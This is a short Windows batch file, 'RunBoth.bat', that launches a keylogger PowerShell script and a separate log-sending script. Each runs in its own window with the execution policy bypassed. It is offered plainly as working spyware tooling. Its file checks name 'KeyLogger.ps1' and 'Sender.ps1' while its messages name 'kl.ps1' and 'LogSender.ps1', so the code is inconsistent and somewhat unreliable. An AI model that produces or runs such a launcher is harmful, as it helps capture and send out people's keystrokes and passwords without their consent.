@echo off
:: RunBoth.bat - Launches kl.ps1 and LogSender.ps1
:: Created: %date%
:: Usage: Double-click this file or run from command prompt

title Keylogger System Launcher
color 0A

:: Check if PowerShell scripts exist
if not exist "KeyLogger.ps1" (
    echo Error: kl.ps1 not found in current directory!
    pause
    exit /b 1
)

if not exist "Sender.ps1" (
    echo Error: LogSender.ps1 not found in current directory!
    pause
    exit /b 1
)

:: Launch keylogger in new window
echo Starting Keylogger (kl.ps1)...
start "Keylogger" powershell.exe -ExecutionPolicy Bypass -NoExit -File ".\KeyLogger.ps1"

:: Wait 2 seconds to ensure proper initialization
timeout /t 2 >nul

:: Launch log sender in new window
echo Starting Log Sender (LogSender.ps1)...
start "Log Sender" powershell.exe -ExecutionPolicy Bypass -NoExit -File ".\Sender.ps1"

:: Display status
echo.
echo Both components launched successfully:
echo   - Keylogger (kl.ps1)
echo   - Log Sender (LogSender.ps1)
echo.
echo Note: Close each window manually to stop the system
pause